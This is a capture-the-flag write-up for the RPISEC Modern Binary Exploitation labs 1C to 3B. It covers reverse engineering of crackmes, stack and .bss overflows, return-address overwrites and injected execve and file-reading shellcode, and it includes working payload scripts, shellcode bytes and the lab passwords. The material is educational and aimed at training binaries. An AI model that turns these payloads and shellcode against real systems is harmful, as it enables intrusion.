# Writeups for MBE

## Lab 1C

### Recon

```
$ ./lab1C
-----------------------------
--- RPISEC - CrackMe v1.0 ---
-----------------------------

Password:
```

It's a crackme, so lets grab out some info about imports from external libraries to get a clue what functionality it provides by using syscalls i.e.:

```
$ rabin2 -ii lab1C
[Imports]
ordinal=001 plt=0xffffffff bind=UNKNOWN type=NOTYPE name=_ITM_deregisterTMCloneTable
ordinal=002 plt=0x08048550 bind=GLOBAL type=FUNC name=printf
ordinal=003 plt=0x08048560 bind=GLOBAL type=FUNC name=puts
ordinal=004 plt=0x08048570 bind=GLOBAL type=FUNC name=system
ordinal=005 plt=0x08048580 bind=UNKNOWN type=NOTYPE name=__gmon_start__
ordinal=006 plt=0x08048590 bind=GLOBAL type=FUNC name=__libc_start_main
ordinal=007 plt=0xffffffff bind=UNKNOWN type=NOTYPE name=_Jv_RegisterClasses
ordinal=008 plt=0x080485a0 bind=GLOBAL type=FUNC name=__isoc99_scanf
ordinal=009 plt=0xffffffff bind=UNKNOWN type=NOTYPE name=_ITM_registerTMCloneTable
```

Nothing super-spectacular, besides the use of ```system``` provided by libc. It's just a first guess, but I think the shot could be to provide lucky password, step onto the right path on "badboy" routine and spawning shell after all.

```
rafind2 -X -s "Password" ./lab1C
0x80d
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x0000080d  5061 7373 776f 7264 3a20 0025 6400 0a41  Password: .%d..A
0x0000081d  7574 6865 6e74 6963 6174 6564 2100 2f62  uthenticated!./b
0x0000082d  696e 2f73 6800 0a49 6e76 616c 6964 2050  in/sh..Invalid P
0x0000083d  6173 7377 6f72 6421 2121 0001 1b03 3b28  assword!!!....;(
0x0000084d  0000 0004 0000 00f8 fcff ff44 0000       ...........D..
0x83c
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x0000083c, 5061 7373 776f 7264 2121 2100 011b 033b  Password!!!....;
0x0000084c, 2800 0000 0400 0000 f8fc ffff 4400 0000  (...........D...
0x0000085c, 65fe ffff 6800 0000 f8fe ffff 8800 0000  e...h...........
0x0000086c, 68ff ffff c400 0000 1400 0000 0000 0000  h...............
0x0000087c, 017a 5200 017c 0801 1b0c 0404 8801       .zR..|........
```

By the way, the string "Password:" and the other shots above are all hard-wired in elf-binaries .rodata section. You can easily check that by using:

```
$ readelf -S ./lab1C
[...]
[15] .rodata           PROGBITS        080487c8 0007c8 000080 00   A  0   0  4
[...]
```

Let's use some radare cmds to find the location where we are faced with "Password:" prompt:

```
[0x080485b0]> iz~Password
vaddr=0x0804880c paddr=0x0000080c ordinal=002 sz=12 len=11 section=.rodata type=a string=\nPassword:
vaddr=0x08048833 paddr=0x00000833 ordinal=005 sz=21 len=20 section=.rodata type=a string=\nInvalid Password!!!
[0x080485b0]> axt @ 0x0804880c
d 0x80486da mov dword [esp], str._nPassword:
[0x080485b0]> pd 1@ 0x0804880c
   ; DATA XREF from 0x080486da (sym.main)
   ;-- str._nPassword::
   0x0804880c     .string "\\nPassword: " ; len=12
```

So in ```main``` there's the prompt. So let's seek to that:

```

│          0x080486ea    89442404       mov dword [esp + 4], eax        ; [0x4:4]=0x10101 
│          0x080486ee    c70424188804.  mov dword [esp], 0x8048818      ; [0x8048818:4]=0xa006425  ; "%d" @ 0x8048818
│          0x080486f5    e8a6feffff     call sym.imp.__isoc99_scanf    ;[3] ;sym.imp.__isoc99_scanf()
```

So at 0x080486f5 there's a call to ```scanf()``` which stores our input in a locally stored variable at esp+0x1C. What's the format specifier at 0x8048818?

```
:> ps @ 0x8048818
%d
``` 

It treats our input as integer, which is then compared to another int at 0x080486fe:

```
0x080486fe    3d9a140000     cmp eax, 0x149a 
```

Our input just has to be 0x149a and we will be faced with a shell afterwars. Fort lazy people lik me there's a radare built-in functionality to compare numbers:

```
:> ? 0x149a
5274 0x149a 012232 5.2K 0000:049a 5274 10011010 5274.0 0.000000f 0.000000
```

You could also use the tool ```rax2``` provided by radare framework to complete that task:

```
:> !!rax2 0x149a
5274
```

[![asciicast](https://asciinema.org/a/xIvKfysNoDOXShVBcp9mVCncU.png)](https://asciinema.org/a/xIvKfysNoDOXShVBcp9mVCncU)

### Pass Lab1B
```
n0_str1ngs_n0_pr0bl3m
```

## Lab1B

### Recon

```
$ ./lab1B
.---------------------------.
|-- RPISEC - CrackMe v2.0 --|
'---------------------------'

Password:
```

This time We have to enter an integer too.
It'll be stored at esp+0x4 by calling ```scanf```. Afterwars there's a call to ```test()```, which gets provided by two arguments on the stack:

- Our input integer and
- A hard wired integer with 0x1337d00d as value

In  ```test``` these values get copied to eax and edx registers. Both values (0x1337d00d and our input) will be subtracted from each other. There's a check afterwards if some condition is met:

```
 ;-- sym.test:                                                                                                                                                                                   
0x08048a74	  push ebp    
0x08048a75	  mov ebp, esp
0x08048a77	  sub esp, 0x28
0x08048a7a	  mov eax, dword [ebp + 8]       ; [0x8:4]=0
0x08048a7d	  mov edx, dword [ebp + 0xc]     ; [0xc:4]=0
0x08048a80	  sub edx, eax
0x08048a82	  mov eax, edx
0x08048a84	  mov dword [ebp-local_3], eax
0x08048a87	  cmp dword [ebp-local_3], 0x15  ; [0x15:4]=0x50000000 
0x08048a8b	  ja 0x8048bd5                  ;[1]
```

So difference of the two operands has to be less equal 0x15, otherwise we'll be rdeirected to functions epilogue and not to ```decrypt``` routine where we want to step into.

If we look closely at the imported functions list, we struggle over a call to ```system()``` with ```decrypt``` as caller. Strategy seems to be to here to input a number passing the check in main and afterwards the one in decryption routine.

Our input will then be xored with a special bytearray loaded by instructions between 0x080489c8 and 0x080489dd

```
0x080489c8    c745e3517d7c.  mov dword [ebp-local_7_1], 0x757c7d51  ; [0x757c7d51:4]=-1   
0x080489cf    c745e7607366.  mov dword [ebp - 0x19], 0x67667360  ; [0x67667360:4]=-1      
0x080489d6    c745eb7e7366.  mov dword [ebp - 0x15], 0x7b66737e  ; [0x7b66737e:4]=-1      
0x080489dd    c745ef7d7c61.  mov dword [ebp - 0x11], 0x33617c7d  ; [0x33617c7d:4]=-1      
```

After that result will be compared against string "Congratulations_".

```
0x08048a28    8b45d8         mov eax, dword [ebp-local_10]                                
0x08048a2b    3b45dc         cmp eax, dword [ebp-local_9]                                 
0x08048a2e    72d8           jb 0x8048a08                  ;[4]
0x08048a30    c7442404038d.  mov dword [esp + 4], str.Congratulations_  ; [0x8048d03:4]=0x676e6f43  ; "Congratulations!" @ 0x8048d03
│           0x08048a38    8d45e3         lea eax, [ebp-local_7_1]                                                                                                                                           
0x08048a3b    890424         mov dword [esp], eax                                         
0x08048a3e    e82dfdffff     call sym.imp.strcmp            ; sub.strcmp_12_76c+0x4 ;[5] ;sub.strcmp_12_76c() ; sym.imp.strcmp
```

I set a breakpoint at 0x080489e8 and printed out the bytearray located on the stack:

```
:> p8 17 @ ebp-0x19
517d7c75607366677e73667b7d7c613300
:> ps @ ebp-0x1d
Q}|u`sfg~sf{}|a3
```

input - 0x1337d00d <= 0x15
input <= 322424866

So summarized there are now the following two conditions:



- diff = Input - 0x1337d00d <= 0x15
- diff ^ b"bQ}|u`sfg~sf{}|a3" = b"Congratulations_"

To solve these equations I used one of my favourite toolset: z3. The script is provided in "lab1B.py"
[![asciicast](https://asciinema.org/a/Z4sFerJotqJG03pw48Vq86gqd.png)](https://asciinema.org/a/Z4sFerJotqJG03pw48Vq86gqd)

### Pass Lab1Bwq
```
1337_3nCRyptI0n_br0
```

## Lab1A

### Recon

After entering some arbitrary username, the program extpects us to input a serial:

```
$ ./lab1A
.---------------------------.
|---------  RPISEC  --------|
|+ SECURE LOGIN SYS v. 3.0 +|
|---------------------------|
|~- Enter your Username:  ~-|
'---------------------------'
???
.---------------------------.
| !! NEW ACCOUNT DETECTED !!|
|---------------------------|
|~- Input your serial:    ~-|
'---------------------------'
```

Let's check the conditions on the serial we have to met.
At 0x08048c12 there's a call to ```scanf()```, which treats out input as unsigned int:

```
:> ps @ 0x8048d00
%u
```

After entering input ```auth``` gets called which will write all input bytes up to newline char to a pointer pointing to ebp+8:

```
0x08048a15	  mov dword [esp + 4], 0x8048d03  ; [0x8048d03:4]=10 
0x08048a1d	  mov eax, dword [ebp + 8]        ; [0x8:4]=0                
0x08048a20	  mov dword [esp], eax                               
0x08048a23	  call sym.imp.strcspn  
```

After wards length of our input is checked via ```strlen()``` with maclen of 32 bytes:

```
0x08048a30	  mov dword [esp + 4], 0x20       ; [0x20:4]=0x2168  ; "h!" 0x00000020
0x08048a38	  mov eax, dword [ebp + 8]        ; [0x8:4]=0
0x08048a3b	  mov dword [esp], eax
0x08048a3e	  call sym.imp.strnlen 
```

In main we observe, that auth has to return 0, and we'll be faced with shell.

input += 3
(input_LSB ^ 0x1337) + 0x5eeded <= 0

### Pass Lab1A
```
1uCKy_Gue55
```

## Lab2C

### Recon

If we look closely into sourcecode, we observe, that there's an obvoius stack-based buffer-overflow bug in the way argv[1] gets handled. Aim is to overwrite local var ```set_me``` with hex value ```0xdeadbeef```, so that function ```shell()``` gets called. The only thing we just don't know yet is the offset we have to use to overwrite local var ```set_me```.

Here's the interesting disassembly part
```
0x08048712	  call sym.imp.strcpy
0x08048718	  cmp dword [esp + 0x2c], 0xdeadbeef
0x08048720	  jne 0x8048729
0x08048722	  call sym.shell
```

So we set a breakpoint before ```strcpy``` gets called and determine the offset between ```esp+0x2c``` (set_me) and our buffer in argv[1].

```
gdb-peda$ b *0x08048718
gdb-peda$ r AAAA
[...]
gdb-peda$ searchmem "AAAA"
Searching for 'AAAA' in: None ranges
Found 2 results, display max 2 items:
[stack] : 0xbffff69d ("AAAA")
[stack] : 0xbffff89e ("AAAA")
```

So we have out buffer twice on stack. The one at higher address is the one originally located in main's argv. The lower one is the one that has been copied into main's stack frame after ```strcpy``` operation.

```
gdb-peda$ p/x ($esp+0x2c) - 0xbffff69d
$1 = 0xf
```

We need an offset of 15 bytes to overwrite local var ```set_me```.

```
$ ./lab2C $(printf "A%.0s" {1..15})$(printf "\xef\xbe\xad\xde")
You did it.
$
```

### Pass Lab2C

```
1m_all_ab0ut_d4t_b33f
```

## Lab2B

### Recon

```C
int main(int argc, char** argv)
{
        if(argc != 2)
        {
                printf("usage:\n%s string\n", argv[0]);
                return EXIT_FAILURE;
        }

        print_name(argv[1]);

        return EXIT_SUCCESS;
}
```
Once agaain, there's an obvious overflow bug in argv[1]'s handling by ```main``` function. But this time ```shell()``` won't be called directly. This time we have to manipulate program's control flow, to get print_name's retuen value to be redirected to shell. It's an RIP overwrite.

```
gdb-peda$ pattern_arg 200
[...]
gdb-peda$ pattern_offsett $eip
994132292 found at offset: 27
```

We would have to determine ```shell()```'s address in .text section by using radare i.e.:

```
r2 -A ./lab2B
 -- Find hexpairs with '/x a0 cc 33'
[0x080485c0]> afl~shell
0x080486bd  19  1  sym.shell
[0x080486bd]> !!rax2 -N 0x080486bd
\xbd\x86\x04\x08
```

We write the identified pattern into temporary file:

```
$ echo $(python -c 'print "A"*27+"\xbd\x86\x04\x08"') > /tmp/pattern.txt
$ gdb --quiet -q ./lab2B
$ gdb-peda$ gdb-peda$ r $(cat /tmp/pattern.txt)
Starting program: /levels/lab02/lab2B $(cat /tmp/pattern.txt)
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAA
[New process 1160]
process 1160 is executing new program: /bin/dash
```

But new process exited with ```EXIT_FAILURE```... So something is missing.
It's the argument for ```shell()``` function. Luckily the string "/bin/sh" is hard wired in binary's text section:

```
$ r2 -A ./lab2B
 -- r2 is meant to be read by machines.
[0x080485c0]> fs strings; f
0x080487d0 8 str._bin_sh
0x080487d8 10 str.Hello__s_n
0x080487e2 18 str.usage:_n_s_string_n
[0x080485c0]> !!rax2 -N 0x080487d0
\xd0\x87\x04\x08
```

We also have to set some some return value after opening shell, but it's value doesn't really matter. After grabbing our flag forked process will die...Who cares?

```
$ echo $(python -c 'print "A"*27+"\xbd\x86\x04\x08" + "JUNK" + "\xd0\x87\x04\x08"') > /tmp/pattern.txt
$ ./lab2B $(cat /tmp/pattern.txt)
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAJUNKЇ
$

```

### Pass Lab2A

```
i_c4ll_wh4t_i_w4nt_n00b
```

## Lab2A

### Recon

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * compiled with:
 * gcc -O0 -fno-stack-protector lab2A.c -o lab2A
 */

void shell()
{
        printf("You got it\n");
        system("/bin/sh");
}

void concatenate_first_chars()
{
        struct {
                char word_buf[12];
                int i;
                char* cat_pointer;
                char cat_buf[10];
        } locals;
        locals.cat_pointer = locals.cat_buf;

        printf("Input 10 words:\n");
        for(locals.i=0; locals.i!=10; locals.i++)
        {
// Read from stdin
                if(fgets(locals.word_buf, 0x10, stdin) == 0 || locals.word_buf[0] == '\n')
                {
                        printf("Failed to read word\n");
                        return;
                }
                // Copy first char from word to next location in concatenated buffer
                *locals.cat_pointer = *locals.word_buf;
                locals.cat_pointer++;
        }

        // Even if something goes wrong, there's a null byte here
        //   preventing buffer overflows
        locals.cat_buf[10] = '\0';
        printf("Here are the first characters from the 10 words concatenated:\n\
%s\n", locals.cat_buf);
}

int main(int argc, char** argv)
{
        if(argc != 1)
        {
                printf("usage:\n%s\n", argv[0]);
                return EXIT_FAILURE;
        }

        concatenate_first_chars();

        printf("Not authenticated\n");
        return EXIT_SUCCESS;
}
```

s we can see, the main function calls a function that calls a function that creates a struct, reads 10 words in, aand prints out first letter of each word.
irst thing to note is, that index variable i is vuln to bein' overflowed, and because loop merely checks i does not equal ten, it can be overflown as we want. This will give us the chance to read in as many bytes as we want, leading to further overflows.

he buffer ```word_buf``` in struct ```locals``` just has capacity for 12 characters and due to alignment on stack, the counter ```i``` should be located at offset 12 in struct. So if we input more than 12 bytes in ```concatenate_first_chars()``` when ```fgets()``` gets called, we should be able to overwrite ```i```. This is the stack just after prologue in ```concatenate_first_chars()``` has been called:

```
gdb-peda$ x/32xw $esp
0xbffff660:     0xffffffff      0xbffff68e      0xb7e2fbf8      0xb7e56273
0xbffff670:     0x00000000      0x00c30000      0x00000001      0x0804856d
0xbffff680:     0xbffff88f      0x0000002f      0x0804a000      0x08048852
0xbffff690:     0x00000001      0xbffff754      0xbffff6b8      0x080487e6
0xbffff6a0:     0xb7fcd3c4      0xb7fff000      0x0804880b      0xb7fcd000
0xbffff6b0:     0x08048800      0x00000000      0x00000000      0xb7e3ca83
0xbffff6c0:     0x00000001      0xbffff754      0xbffff75c      0xb7feccea
0xbffff6d0:     0x00000001      0xbffff754      0xbffff6f4      0x0804a020
```
And here's the stack layout after a word (here just consisting of one A and a trailing newline) has been entered:

```
gdb-peda$ x/32xw $esp
0xbffff660:     0xbffff670      0x00000010      0xb7fcdc20      0xb7e56273
0xbffff670:     0x00000a41      0x00c30000      0x00000001      0x00000000    <= 0xbffff670 is loc of input buffer
0xbffff680:     0xbffff684      0x0000002f      0x0804a000      0x08048852
0xbffff690:     0x00000001      0xbffff754      0xbffff6b8      0x080487e6
0xbffff6a0:     0xb7fcd3c4      0xb7fff000      0x0804880b      0xb7fcd000
0xbffff6b0:     0x08048800      0x00000000      0x00000000      0xb7e3ca83
0xbffff6c0:     0x00000001      0xbffff754      0xbffff75c      0xb7feccea
0xbffff6d0:     0x00000001      0xbffff754      0xbffff6f4      0x0804a020
```

We have inputted 12 A's and value at 0xbffff67c is is value of '\n' after it has been incremented (i++):

```
gdb-peda$ x/32xw $esp
0xbffff660:     0xbffff670      0x00000010      0xb7fcdc20      0xb7e56273
0xbffff670:     0x41414141      0x41414141      0x41414141      0x0000000b
0xbffff680:     0xbffff685      0x00000041      0x0804a000      0x08048852
0xbffff690:     0x00000001      0xbffff754      0xbffff6b8      0x080487e6
0xbffff6a0:     0xb7fcd3c4      0xb7fff000      0x0804880b      0xb7fcd000
0xbffff6b0:     0x08048800      0x00000000      0x00000000      0xb7e3ca83
0xbffff6c0:     0x00000001      0xbffff754      0xbffff75c      0xb7feccea
0xbffff6d0:     0x00000001      0xbffff754      0xbffff6f4      0x0804a020
```
So our payload consists of 12 A's + "\n", where 13th byte overwrites i.
At 0xbffff680 there's the location where each character is stored. It must be overflown to overwrite return address of function, which is at 0xbffff69c:

```
gdb-peda$ i frame 0
Stack frame at 0xbffff6a0:
 eip = 0x8048795 in concatenate_first_chars; saved eip = 0x80487e6
 called by frame at 0xbffff6c0
 Arglist at 0xbffff698, args:
 Locals at 0xbffff698, Previous frame's sp is 0xbffff6a0
 Saved registers:
  ebp at 0xbffff698, eip at 0xbffff69c
```
So after writing 24 more bytes (including the first overflow byte) we should be able to overwrite RIP.

```
$ python -c 'print "A"*12+"\n"+"B\n"*23+"\xef\n"+"\xbe\n"+"\xad\n"+"\xde\n"' > /tmp/pattern2.txt
[...]
gdb-peda$ r < <(cat /tmp/pattern2.txt) 
Stopped reason: SIGSEGV
0xdeadbeef in ?? ()
```

Now we have to find the address of ```shell()``` function we want to return to:

```
gdb-peda$ p shell
$1 = {<text variable, no debug info>} 0x80486fd <shell>
[...]
$ python -c 'print "A"*12+"\n"+"B\n"*23+"\xfd\n"+"\x86\n"+"\x04\n"+"\x08\n"' > /tmp/pattern2.txt
$ (cat /tmp/pattern2.txt; cat -) | ./lab2A
Input 10 words:
Failed to read word
You got it
ls
lab2A  lab2A.c  lab2B  lab2B.c  lab2C  lab2C.c
```

The ```cat - ``` command is for leaving stdin open.

### Pass Lab2end

```
D1d_y0u_enj0y_y0ur_cats?
```

## lab 3C
### Recon

Labs in level 3 are focussed on shellcoding and this time we have access to source code files of challs.

```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* gcc -z execstack -fno-stack-protector -o lab3C lab3C.c */

char a_user_name[100];

int verify_user_name()
{
    puts("verifying username....\n");
    return strncmp(a_user_name, "rpisec", 6);
}

int verify_user_pass(char *a_user_pass)
{
    return strncmp(a_user_pass, "admin", 5);
}

int main()
{
    char a_user_pass[64] = {0};
    int x = 0;

    /* prompt for the username - read 100 byes */
    printf("********* ADMIN LOGIN PROMPT *********\n");
    printf("Enter Username: ");
    fgets(a_user_name, 0x100, stdin);

    /* verify input username */
    x = verify_user_name()
    if (x != 0){
        puts("nope, incorrect username...\n");
        return EXIT_FAILURE;
    }

    /* prompt for admin password - read 64 bytes */
    printf("Enter Password: \n");
    fgets(a_user_pass, 0x64, stdin);

    /* verify input password */
    x = verify_user_pass(a_user_pass);
    if (x == 0 || x != 0){
        puts("nope, incorrect password...\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
```
We have a 100 bytes buffer in binary's .bss section and three functions:

1. First verfifies username and checks if first six bytes of input are equal to "ripsec".
2. Second verifies password with a comparison to "admin".
3. Third is main function
        * Input supplied by user is copied to a 0x100 (256) bytes buffer via ```fgets()```
        * Here is also the major security hole. ```fgets(x, 0x100, stdin)``` does not read 100 bytes, it does read 256 bytes on the address provided by x. This allows for a overflow in .bss section

Here we have our strategy:
* Provocate an overflow while reading username, while providing first six bytes to be "rpisec" 
* Since binary doesn't have NX-bit enabled we also can place some shellcode in buffer, prepending a large enough nop slide.
```
$ checksec lab3C
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY FORTIFIED FORTIFY-able  FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No      0               4       lab3C
```
* Since ```fgets()``` will get triggered twice, after providing 256 bytes of username, there will be 100 bytes (enough space!!!) left for shellcode.

An interesting aspect is, that "EXIT_FAILURE"-path in ```main()``` will never be triggered if some bytes not equal to zero have been written to ```x```.

So our payload will look like:

```bash
#!/bin/bash

username=`printf "rpisec"`
pattern=`printf "%.sA" {1..249}`
payload=`printf "%.sB" {1..100}`

echo $username$pattern$payload
```



### Pass Lab3C
```
th3r3_iz_n0_4dm1ns_0n1y_U!
```
Let's look at our buffer after second call to ```fgets()``` has been executed:

```
gdb-peda$ b *0x08048838
Breakpoint 1 at 0x8048838
gdb-peda$ r < /tmp/payload
[...]
gdb-peda$ p &a_user_name
$2 = (<data variable, no debug info> *) 0x8049c40 <a_user_name>
gdb-peda$ x/256xw 0x8049c40
0x8049c40 <a_user_name>:        0x73697072      0x41416365      0x41414141      0x41414141
0x8049c50 <a_user_name+16>:     0x41414141      0x41414141      0x41414141      0x41414141
0x8049c60 <a_user_name+32>:     0x41414141      0x41414141      0x41414141      0x41414141
0x8049c70 <a_user_name+48>:     0x41414141      0x41414141      0x41414141      0x41414141
0x8049c80 <a_user_name+64>:     0x41414141      0x41414141      0x41414141      0x41414141
0x8049c90 <a_user_name+80>:     0x41414141      0x41414141      0x41414141      0x41414141
0x8049ca0 <a_user_name+96>:     0x41414141      0x41414141      0x41414141      0x41414141
0x8049cb0:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049cc0:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049cd0:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049ce0:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049cf0:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049d00:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049d10:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049d20:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049d30:      0x41414141      0x41414141      0x41414141      0x00414141
```
 We have fully overwritten the variable and first six bytes are equal to "rpisec":

 ```
gdb-peda$ x/6c (void *)0x8049c40
0x8049c40 <a_user_name>:        0x72    0x70    0x69    0x73    0x65    0x63
gdb-peda$ x/s (void *)0x8049c40
0x8049c40 <a_user_name>:        "rpisec", 'A' <repeats 194 times>...
```
If we continue execution, we should observe a segfault:

```
gdb-peda$ c
[...]
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$
```

Nice, we control EIP, so what's the correct offset to overwrite Return Instruction Ptr?

```
gdb-peda$ r < /tmp/payload
[...]
gdb-peda$ bt
#0  0x08048838 in main ()
#1  0x42424242 in ?? ()
#2  0x42424242 in ?? ()
#3  0x42424242 in ?? ()
#4  0x42424242 in ?? ()
#5  0x00424242 in ?? ()
#6  0x00000001 in ?? ()
#7  0xbffff754 in ?? ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
gdb-peda$ i frame 0
Stack frame at 0xbffff6c0:
 eip = 0x8048838 in main; saved eip = 0x42424242
 called by frame at 0xbffff6c4
 Arglist at 0xbffff6b8, args:
 Locals at 0xbffff6b8, Previous frame's sp is 0xbffff6c0
 Saved registers:
  ebx at 0xbffff6b0, ebp at 0xbffff6b8, edi at 0xbffff6b4, eip at 0xbffff6bc
gdb-peda$ x/32xw $esp
0xbffff650:     0xbffff66c      0x00000064      0xb7fcdc20      0xb7eb8216
0xbffff660:     0xffffffff      0xbffff68e      0xb7e2fbf8      0x42424242
0xbffff670:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff680:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff690:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff6a0:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff6b0:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff6c0:     0x42424242      0x42424242      0x42424242      0x00424242
gdb-peda$ distance 0xbffff66c 0xbffff6bc
From 0xbffff66c to 0xbffff6bc: 80 bytes, 20 dwords
gdb-peda$
```

So offset to RIP is at offset 80 bytes in buffer filled with B's or 20 dwords apart from start of the same. There's a handy feature in radare for accomplsishing that task:
```
$ r2 --
 -- The door is everything..
[0x00000000]> e asm.bits=32 
[0x00000000]> gi exec
[0x00000000]> g
31c050682f2f7368682f62696e89e3505389e199b00bcd80
[0x00000000]> q
lab3C@warzone:/levels/lab03$ echo -n "31c050682f2f7368682f62696e89e3505389e199b00bcd80" | wc -c
48
lab3C@warzone:/levels/lab03$ echo "31c050682f2f7368682f62696e89e3505389e199b00bcd80" | sed -e 's/\(..\)/\\x\1/g'
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```
So payload will now look like:

```
$ cat /tmp/lab3C.sh
#!/bin/bash

username=`printf "rpisec"`
nopsled=`printf "%.s\x90" {1..12}`
pattern=`printf "%.sA" {1..213}`
payload=`printf "%.sB" {1..80}`
shellcode=`printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"`
echo $username$nopsled$shellcode$pattern$payload
lab3C@warzone:/levels/lab03$ /tmp/lab3C.sh > /tmp/payload                                             
lab3C@warzone:/levels/lab03$ hexdump -C /tmp/payload
00000000  72 70 69 73 65 63 90 90  90 90 90 90 90 90 90 90  |rpisec..........|
00000010  90 90 31 c0 50 68 2f 2f  73 68 68 2f 62 69 6e 89  |..1.Ph//shh/bin.|
00000020  e3 50 53 89 e1 99 b0 0b  cd 80 41 41 41 41 41 41  |.PS.......AAAAAA|
00000030  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
*
000000f0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 42  |AAAAAAAAAAAAAAAB|
00000100  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42  |BBBBBBBBBBBBBBBB|
*
00000140  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 0a  |BBBBBBBBBBBBBBB.|
```

Disassembly near first call to ```fgets()``` reveals, that our buffer (username) will be stored at 0x8049c40 (.data section):

```
 0x80487e0 <main+80>: mov    DWORD PTR [esp],0x8049c40
=> 0x80487e7 <main+87>: call   0x80485f0 <fgets@plt>
gdb-peda$ vmmap 0x8049c40
Start      End        Perm      Name
0x08049000 0x0804a000 rwxp      /levels/lab03/lab3C
```

We will use this information to specify the value RIP gets overwritten with. Actually our payload will be generated like this:

```bash
#!/bin/bash

username=`printf "rpisec"`
nopsled=`printf "%.s\x90" {1..12}`
pattern=`printf "%.sA" {1..213}`
payload=`printf "%.sB" {1..80}`
shellcode=`printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"`
rip=`printf "\x48\x9c\x04\x08"`
echo $username$nopsled$shellcode$pattern$payload$rip
```

Finally we need to execute our exploit as such:

```
$ (cat /tmp/payload; cat) | ./lab3C
cat /home/lab3B/.pass
th3r3_iz_n0_4dm1ns_0n1y_U!
```

### Pass Lab3B
```
th3r3_iz_n0_4dm1ns_0n1y_U!
```
## Lab 3B
### Recon

```C
#include <signal.h>
#include <assert.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/reg.h>
#include <sys/prctl.h>
#include <wait.h>
#include "utils.h"

ENABLE_TIMEOUT(60)

/* gcc -z execstack -fno-stack-protector -o lab3B lab3B.c */

/* hint: write shellcode that opens and reads the .pass file.
   ptrace() is meant to deter you from using /bin/sh shellcode */

int main()
{
    pid_t child = fork();
    char buffer[128] = {0};
    int syscall = 0;
    int status = 0;

    if(child == 0)
    {
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);

        /* this is all you need to worry about */
        puts("just give me some shellcode, k");
        gets(buffer);
    }
    else
    {
        /* mini exec() sandbox, you can ignore this */
        while(1)
        {
            wait(&status);
            if (WIFEXITED(status) || WIFSIGNALED(status)){
                puts("child is exiting...");
                break;
            }

            /* grab the syscall # */
            syscall = ptrace(PTRACE_PEEKUSER, child, 4 * ORIG_EAX, NULL);

            /* filter out syscall 11, exec */
            if(syscall == 11)
            {
                printf("no exec() for you\n");
                kill(child, SIGKILL);
                break;
            }
        }
    }

    return EXIT_SUCCESS;
}
```
Finding the bug this time is as easy as it could be...User supplied will be read by ```gets()``` without checking length and thus leaving the possibility to trigger stack-based RIP overwrite with customized shellcode. But this time there isn't the possibility to just generate a shellcode that uses execve syscall cause main will stop us doing this.
Some background infos:
* Call to ```prctl(PR_SET_PDEATHSIG, SIGHUP);``` ensures that child gets killed if parent dies.
* Using a call to ```ptrace(PTRACE_TRACEME,...)``` child's execution flow gets controlled by it's parent
* The syscall that is performed by child gets checked by parent if child exits. It does this by providing variable "PTRACE_PEEKUSER" to ```ptrace()``` which will read in tracee's USER area that is defined in <sys/user.h>:

```C
struct user_regs_struct {
	unsigned long	bx;
	unsigned long	cx;
	unsigned long	dx;
	unsigned long	si;
	unsigned long	di;
	unsigned long	bp;
	unsigned long	ax;
	unsigned long	ds;
	unsigned long	es;
	unsigned long	fs;
	unsigned long	gs;
	unsigned long	orig_ax;
	unsigned long	ip;
	unsigned long	cs;
	unsigned long	flags;
	unsigned long	sp;
	unsigned long	ss;
};
```
* ```orig_eax``` contains syscall num for call that has been made

## Exploit

To exploit this program we have to write custom shell code that opens, reads and writes out contents of /home/lab3A/.pass. Main problem is that while testing exploit in gdb, gdb will fork to new spawned process which will always run as user lab3B. To fix this we'll test our constructed payload with trying to dump contents of /home/lab3B/.pass. There are lot of ways to craft simple shellcode that way. I will introduce a few of them.

At first let's take a look at our 32-bit shellcode so far:

```
; zero registers
xor ecx, ecx
xor eax, eax
xor edx, edx
xor ebx, ebx

; open file
push 0x73736170                 ; push filename little-endian style
push 0x2e2f4133
push 0x62616c2f
push 0x656d6f68
push 0x2f424242                 ; 0x424242 gets rid of null-bytes
add esp, 0x3                    ; inc esp to get rid of null bytes
mov ebx, esp                    ; string pointer to ebx
mov byte [ebx+0x11], 0x0        ; Terminate filename string
mov al, 5                       ; syscall integer
mov dl, 4                       ; read only
int 0x80                        ; interrupt

; read file
xor edx, edx                    ; zero edx
xchg eax, ebx                   ; put file descriptor into ebx
